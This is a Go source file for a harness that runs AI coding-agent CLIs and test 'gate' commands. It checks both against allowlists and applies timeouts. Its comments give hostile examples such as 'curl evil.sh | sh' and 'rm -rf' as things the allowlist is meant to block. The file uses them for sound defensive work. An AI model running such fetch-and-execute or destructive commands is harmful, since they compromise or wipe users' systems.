package harness

import (
	"bufio"
	"context"
	"errors"
	"fmt"
	"io"
	"os/exec"
	"strings"
	"sync"
	"time"
)

// AgentID identifies a supported AI agent.
type AgentID string

const (
	AgentClaude  AgentID = "claude"
	AgentCursor  AgentID = "cursor"
	AgentCodex   AgentID = "codex"
	AgentCopilot AgentID = "copilot"
	AgentGemini  AgentID = "gemini"
)

// AgentConfig holds configuration for an AI agent.
type AgentConfig struct {
	ID         AgentID
	Command    string
	Args       []string
	WorkingDir string
	MaxTokens  int
	Model      string
	Timeout    time.Duration // 0 = use DefaultAgentTimeout
}

// AgentResult is the output of an agent execution.
type AgentResult struct {
	Success    bool
	Output     string
	Error      string
	Duration   time.Duration
	TokensUsed int
}

// AgentRunner handles executing AI agents with streaming output and a
// security-first command allowlist. The runner rejects any agent command that
// is not in `allowedAgentCommands`, preventing prompt injection from
// hijacking the orchestrator into running arbitrary binaries (curl, rm,
// wget, etc.).
type AgentRunner struct {
	config AgentConfig
	mu     sync.Mutex
}

// DefaultAgentTimeout caps any single agent invocation. SDD features can take
// minutes to complete (LLM round-trips + tooling), but unbounded runs let a
// hung agent stall a feature forever.
const DefaultAgentTimeout = 10 * time.Minute

// DefaultGateTimeout caps any single gate (test runner, type-checker) run.
// Gates should be fast; a hung gate is almost always a sign of a flaky test
// or a deadlock that the harness should surface, not wait out.
const DefaultGateTimeout = 5 * time.Minute

// allowedAgentCommands is the closed set of binaries the harness is allowed
// to spawn as an AI agent. Anything else is refused with a clear error.
// Update this list when adding new adapters; do not loosen it on demand.
var allowedAgentCommands = map[string]struct{}{
	"claude":  {}, // Claude Code
	"codex":   {}, // OpenAI Codex CLI
	"cursor":  {}, // Cursor agent
	"copilot": {}, // GitHub Copilot CLI
	"gemini":  {}, // Gemini CLI
}

// allowedGateBinaries is the closed set of binaries that tasks.md may invoke
// as a "gate" command. Combined with `validateGateCommand` it prevents a
// malicious or naive spec from running `rm -rf` or `curl evil.sh | sh`.
var allowedGateBinaries = map[string]struct{}{
	"node":   {},
	"npm":    {},
	"pnpm":   {},
	"yarn":   {},
	"bun":    {},
	"deno":   {},
	"go":     {},
	"make":   {},
	"pytest": {},
	"python": {},
	"python3": {},
	"pip":    {},
	"cargo":  {},
	"rustc":  {},
	"jest":   {},
	"vitest": {},
	"tsc":    {},
	"eslint": {},
	"shellcheck": {},
}

// NewAgentRunner creates a new agent runner. It validates the configured
// command against the allowlist and refuses to construct a runner for any
// binary outside the closed set. Callers that need to run a different
// binary must explicitly opt in (e.g. via a future plugin system).
func NewAgentRunner(cfg AgentConfig) (*AgentRunner, error) {
	if cfg.Command == "" {
		return nil, errors.New("agent command is empty")
	}
	// Strip path — only basename matters for the allowlist; full path is
	// resolved at exec time via $PATH so the runner still works after
	// `which` finds the binary in the user's environment.
	base := cfg.Command
	if idx := strings.LastIndexAny(base, "/\\"); idx >= 0 {
		base = base[idx+1:]
	}
	if _, ok := allowedAgentCommands[base]; !ok {
		return nil, fmt.Errorf("agent command %q is not in the allowlist (allowed: %s)",
			cfg.Command, strings.Join(sortedKeys(allowedAgentCommands), ", "))
	}
	if cfg.Timeout == 0 {
		cfg.Timeout = DefaultAgentTimeout
	}
	return &AgentRunner{config: cfg}, nil
}

// validateGateCommand checks that every executable token in a tasks.md gate
// command resolves to a binary in `allowedGateBinaries`. It splits on `&&`,
// `||`, `;`, `|`, and whitespace so compound shell expressions like
// `npm test && go test` are fully validated.
func validateGateCommand(gate string) error {
	gate = strings.TrimSpace(gate)
	if gate == "" {
		return nil
	}
	// Split on shell metacharacters so each side is validated independently.
	// We don't parse quoting/escaping — gate syntax should be simple.
	parts := splitShellTokens(gate)
	if len(parts) == 0 {
		return nil
	}
	for _, part := range parts {
		// Skip shell operators and common flags/env-var prefixes.
		if isShellOperator(part) || strings.HasPrefix(part, "-") || strings.Contains(part, "=") {
			continue
		}
		base := part
		if idx := strings.LastIndexAny(base, "/\\"); idx >= 0 {
			base = base[idx+1:]
		}
		if _, ok := allowedGateBinaries[base]; !ok {
			return fmt.Errorf("gate binary %q is not in the allowlist (allowed: %s)",
				base, strings.Join(sortedKeys(allowedGateBinaries), ", "))
		}
	}
	return nil
}

func isShellOperator(s string) bool {
	switch s {
	case "&&", "||", "|", ";", "&", ">", ">>", "<", "<<", "(", ")":
		return true
	}
	return false
}

// splitShellTokens is a deliberately tiny shell tokenizer — just enough to
// split compound commands. It does not handle quoting; gate authors should
// keep gate commands simple.
func splitShellTokens(cmd string) []string {
	// Replace shell operators with spaces, then split on whitespace.
	repl := strings.NewReplacer(
		"&&", " ", "||", " ", "|", " ",
		";", " ", ">", " ", "<", " ",
		"(", " ", ")", " ",
	)
	return strings.Fields(repl.Replace(cmd))
}

func sortedKeys(m map[string]struct{}) []string {
	out := make([]string, 0, len(m))
	for k := range m {
		out = append(out, k)
	}
	// Small maps; insertion-sort is fine and avoids pulling in `sort` for clarity.
	for i := 1; i < len(out); i++ {
		for j := i; j > 0 && out[j-1] > out[j]; j-- {
			out[j-1], out[j] = out[j], out[j-1]
		}
	}
	return out
}

// Run executes the agent with a prompt, streams output, and enforces a
// timeout. Cancellation propagates from ctx.
func (r *AgentRunner) Run(ctx context.Context, prompt string) (*AgentResult, error) {
	return r.RunStreaming(ctx, prompt, nil)
}

// RunStreaming executes the agent and calls onLine for each output line.
// Pass onLine=nil to discard output. The returned AgentResult carries the
// full captured output regardless of onLine.
func (r *AgentRunner) RunStreaming(ctx context.Context, prompt string, onLine func(line string)) (*AgentResult, error) {
	start := time.Now()

	timeout := r.config.Timeout
	if timeout == 0 {
		timeout = DefaultAgentTimeout
	}
	runCtx, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()

	args := r.buildArgs(prompt)
	cmd := exec.CommandContext(runCtx, r.config.Command, args...)
	cmd.Dir = r.config.WorkingDir

	stdout, err := cmd.StdoutPipe()
	if err != nil {
		return nil, fmt.Errorf("stdout pipe: %w", err)
	}
	stderr, err := cmd.StderrPipe()
	if err != nil {
		return nil, fmt.Errorf("stderr pipe: %w", err)
	}

	if err := cmd.Start(); err != nil {
		return nil, fmt.Errorf("start agent: %w", err)
	}

	var (
		output strings.Builder
		wg     sync.WaitGroup
	)
	wg.Add(2)
	go func() {
		defer wg.Done()
		streamLines(stdout, &output, onLine, "    [agent] ")
	}()
	go func() {
		defer wg.Done()
		streamLines(stderr, nil, onLine, "    [agent:err] ")
	}()
	wg.Wait()

	waitErr := cmd.Wait()
	duration := time.Since(start)

	result := &AgentResult{
		Success:    waitErr == nil,
		Output:     output.String(),
		Duration:   duration,
		TokensUsed: EstimateTokens(prompt) + EstimateTokens(output.String()),
	}
	if waitErr != nil {
		// Surface the underlying error verbatim; if it was a timeout, the
		// context's err will say "context deadline exceeded" which is what
		// the caller needs to know whether to retry.
		result.Error = waitErr.Error()
		if errors.Is(runCtx.Err(), context.DeadlineExceeded) {
			result.Error = "agent timeout after " + timeout.String() + ": " + waitErr.Error()
		}
	}
	return result, nil
}

func streamLines(r io.Reader, into *strings.Builder, onLine func(string), prefix string) {
	scanner := bufio.NewScanner(r)
	// Allow long lines (LLM outputs can be huge single lines).
	scanner.Buffer(make([]byte, 0, 64*1024), 1024*1024)
	for scanner.Scan() {
		line := scanner.Text()
		if into != nil {
			into.WriteString(line)
			into.WriteByte('\n')
		}
		if onLine != nil {
			onLine(prefix + line)
		} else if prefix != "" {
			fmt.Println(prefix + line)
		}
	}
}

// buildArgs constructs the command arguments for the agent.
func (r *AgentRunner) buildArgs(prompt string) []string {
	switch r.config.ID {
	case AgentClaude:
		args := []string{"-p", prompt}
		if r.config.Model != "" {
			args = append(args, "--model", r.config.Model)
		}
		return append(args, r.config.Args...)
	default:
		// Cursor, Codex, Copilot, Gemini all accept `-p <prompt>` style.
		return append([]string{"-p", prompt}, r.config.Args...)
	}
}

// DetectAgent finds the best available AI agent on the system by scanning
// $PATH. Order is alphabetical and vendor-neutral — no agent is privileged.
// The first one found wins; if you want a specific agent, pass it via
// `radiant run --agent=…` rather than relying on detection.
func DetectAgent() (AgentID, string) {
	priority := []AgentID{AgentClaude, AgentCodex, AgentCopilot, AgentCursor, AgentGemini}
	for _, id := range priority {
		cmd := string(id)
		if _, err := exec.LookPath(cmd); err == nil {
			return id, cmd
		}
	}
	return "", ""
}

// IsAgentAvailable checks if a specific agent is installed and in the
// allowlist. Useful for `--agent=foo` flag validation before scheduling.
func IsAgentAvailable(command string) bool {
	base := command
	if idx := strings.LastIndexAny(base, "/\\"); idx >= 0 {
		base = base[idx+1:]
	}
	if _, ok := allowedAgentCommands[base]; !ok {
		return false
	}
	_, err := exec.LookPath(command)
	return err == nil
}
